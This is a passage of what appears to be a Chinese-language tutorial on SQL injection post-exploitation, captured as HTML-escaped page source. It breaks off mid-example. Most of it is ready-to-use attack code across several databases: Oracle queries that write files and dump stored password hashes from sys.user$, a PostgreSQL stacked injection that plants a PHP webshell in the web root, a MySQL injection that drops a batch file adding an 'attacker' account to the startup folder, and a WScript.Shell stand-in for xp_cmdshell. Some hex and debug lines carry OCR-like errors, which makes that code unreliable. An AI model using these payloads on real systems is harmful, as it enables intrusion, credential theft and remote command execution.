&amp;gt;&amp;gt;c:\temp\test.txt&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#先创建一个debug.exe脚本文件，然后将它传递给debug.exe以转换成一个二进制文件。&lt;/span&gt;
C:\&lt;span class=&#34;token keyword&#34;&gt;temp&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;debug &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; demo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;scr
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;n demo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;e &lt;span class=&#34;token number&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;D &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;A &lt;span class=&#34;token number&#34;&gt;90&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;03&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;04&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; FF FF &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;e &lt;span class=&#34;token number&#34;&gt;0010&lt;/span&gt; B8 &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; o0 o0 &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;е &lt;span class=&#34;token number&#34;&gt;0040&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;E &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;F BA OE &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; B4 &lt;span class=&#34;token number&#34;&gt;09&lt;/span&gt; CD &lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt; B8 &lt;span class=&#34;token number&#34;&gt;01&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;C CD &lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;54&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;68&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;е &lt;span class=&#34;token number&#34;&gt;0050&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;69&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;73&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;70&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;F &lt;span class=&#34;token number&#34;&gt;67&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;61&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;D &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;63&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;61&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;E &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;E &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;F
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;е &lt;span class=&#34;token number&#34;&gt;0060&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;62&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;75&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;E &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;69&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;E &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;44&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;F &lt;span class=&#34;token number&#34;&gt;53&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;e &lt;span class=&#34;token number&#34;&gt;0070&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;D &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;F &lt;span class=&#34;token number&#34;&gt;64&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;E OD OD &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;A &lt;span class=&#34;token number&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;rex
CX &lt;span class=&#34;token number&#34;&gt;0000&lt;/span&gt;
:&lt;span class=&#34;token number&#34;&gt;4200&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;w &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
Writing &lt;span class=&#34;token number&#34;&gt;04200&lt;/span&gt; bytes
&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;q
C:\&lt;span class=&#34;token keyword&#34;&gt;temp&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;dir demo&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;token number&#34;&gt;2008&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;27&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;token number&#34;&gt;18&lt;/span&gt;p	&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;896&lt;/span&gt; demo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com
&lt;span class=&#34;token number&#34;&gt;2005&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:&lt;span class=&#34;token number&#34;&gt;08&lt;/span&gt;a	&lt;span class=&#34;token number&#34;&gt;61&lt;/span&gt;r280 demo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;scr


copy &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;b chunk&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1.&lt;/span&gt;exe_ &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; chunk&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2.&lt;/span&gt;exe_ &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; chunk&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe original&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;Oracle-6&#34;&gt;&lt;a href=&#34;#Oracle-6&#34; class=&#34;headerlink&#34; title=&#34;Oracle&#34;&gt;&lt;/a&gt;Oracle&lt;/h5&gt;&lt;p&gt;Oracle中多种创建文件的方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;UTL_FILE
DBMS_ADVISOR
DBMS_XSLPROCESSOR
DBMS_XMLDOM
外部表
Java
操作系统命令和重定向&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;自Oracle 9i以来，utl_file可以在文件系统上写二进制代码。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#在数据库服务器的C:驱动器或恰当的UNIX路径中创建了一个二进制文件hello.com：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;Create&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt; directory EXT &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\&#39;;
DECLARE fi UTL_FILE.FILE_TYPE;
bu RAW(32767);
BEGIN
bu:=hextoraw(1BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
fi:&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;UTL_FILE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fopen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;EXT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hello.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;32767&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
UTL_FILE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put_raw&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fi&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bu&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
UTL_FILE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fclose&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;DBMS_ADVISOR可能是创建文件的最快捷方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; directory EXT &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\&#39;;
exec SYS.DBMS_ADVISOR.CREATE_FILE(&#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;first&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;, &#39;&lt;/span&gt;EXT&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;victim&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;自Oracle 10g以来，可以使用外部表创建一个包含用户名和口令的文件&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; directory EXT &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\&#39;;
CREATE TABLE ext_write (
myline)
ORGANIZATION EXTERNAL
(TYPE oracle_datapump
DEFAULT DIRECTORY EXT
LOCATION (&#39;&lt;/span&gt;victim3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt&lt;span class=&#34;token string&#34;&gt;&#39;))
PARALLEL
AS
SELECT &#39;&lt;/span&gt;I was here&lt;span class=&#34;token string&#34;&gt;&#39; from dual UNION SELECT name ||&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&#39;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;$&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;DBMS_XSLPROCESSOR可以将XML文件写入文件系统&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; dbms_xslprocessor&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;clob2file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;your_xml&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MYDIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;outfile.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;另外还可以通过DBMS_XMLDOM访问文统：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; DIRECTORY XML_DIR &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\xmlfiles&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; DBMS_XMLDOM&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;writeToFile&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;doc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;XML_DIR/outfile.xml&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;PostgreSQL-4&#34;&gt;&lt;a href=&#34;#PostgreSQL-4&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL&#34;&gt;&lt;/a&gt;PostgreSQL&lt;/h5&gt;&lt;p&gt;PostgreSQL不但支持使用COPY功能读取文件，还支持使用COPY功能写入文件，它可以将表中的内容以文本格式写入一个文件中(每一行文本表示表中的一行数据)。文件将按照运行PostgreSQL进程(通常是postgres用户)的用户来创建，因此该用户需要对文件所在的路径具有写入权限。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#假定底层数据库用户具有所要求的“超级用户”权限,创建一个临时表&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//10.10.10.128/test.php?id=1; create table hack(data text);-- &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#在表中插入PHP Webshell代码&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//10.10.10.128/test.php?id=1; insert into hack(data) values (&#34;&amp;lt;?php passthru($_GET[&#39;cmd&#39;]);&amp;gt;&#34;);-- &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#将表中的数据复制到一个文件中，将该文件放在Web根目录(Webroot)下&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//10.10.10.128/test.php?id=1; copy(select data from hack) to &#39;/var/www/shell.php&#39;;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一些能够利用的函数&lt;/p&gt;
&lt;p&gt;lo_create()、lo_export()和lo_unlink()&lt;/p&gt;
&lt;h3 id=&#34;执行操作系统命令&#34;&gt;&lt;a href=&#34;#执行操作系统命令&#34; class=&#34;headerlink&#34; title=&#34;执行操作系统命令&#34;&gt;&lt;/a&gt;执行操作系统命令&lt;/h3&gt;&lt;h4 id=&#34;MySQL-2&#34;&gt;&lt;a href=&#34;#MySQL-2&#34; class=&#34;headerlink&#34; title=&#34;MySQL&#34;&gt;&lt;/a&gt;MySQL&lt;/h4&gt;&lt;p&gt;MySQL服务器和Web服务器位于同一机器上，这样就能使用”select into DUMPFILE”技术在目标机器上构造一个欺骗性的公共网关接口(CGI)&lt;/p&gt;
&lt;p&gt;在WAMP(Windows、Apache、MySQL和PHP)环境中，MySQL常常运行在特权用户权限下，因此攻击者可以在系统的任何位置写入文件。可以根据这一特点采用被动代码执行技术(passive code execution),比如在Administrator的启动文件夹中创建一个批处理文 件。当管理员登录到系统后，攻击者的批处理文件将被执行，并且攻击者的代码将在管理员权 限下执行。&lt;/p&gt;
&lt;p&gt;下面的例子演示了这种攻击：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//vulnsite/vuln.php?name=test&#39; union select &#39;net user attacker pwd /add&#39; into outfile &#39;c:\documents and settings\all users\start menu\programs\startup\owned.bat&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Mssql-2&#34;&gt;&lt;a href=&#34;#Mssql-2&#34; class=&#34;headerlink&#34; title=&#34;Mssql&#34;&gt;&lt;/a&gt;Mssql&lt;/h4&gt;&lt;p&gt;xp_cmdshell的妙用&lt;/p&gt;
&lt;p&gt;现代版本的SQL Server默认禁用了 xp_cmdshell，可以使用sp_configure语句并通过带内信令(signaling)再次打开它。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#通过T-SQL初始化Wscript.Shell实例的方法&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PROCEDURE&lt;/span&gt; xp_cmdshell3&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@cmd&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; @ wait &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;Create&lt;/span&gt; wscript&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Shell object 
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@result&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@RunResult&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@ShellID&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sp_OACreate &lt;span class=&#34;token string&#34;&gt;&#39;WScript.Shell&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@shellID&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OUT&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@OLEResult&lt;/span&gt; 
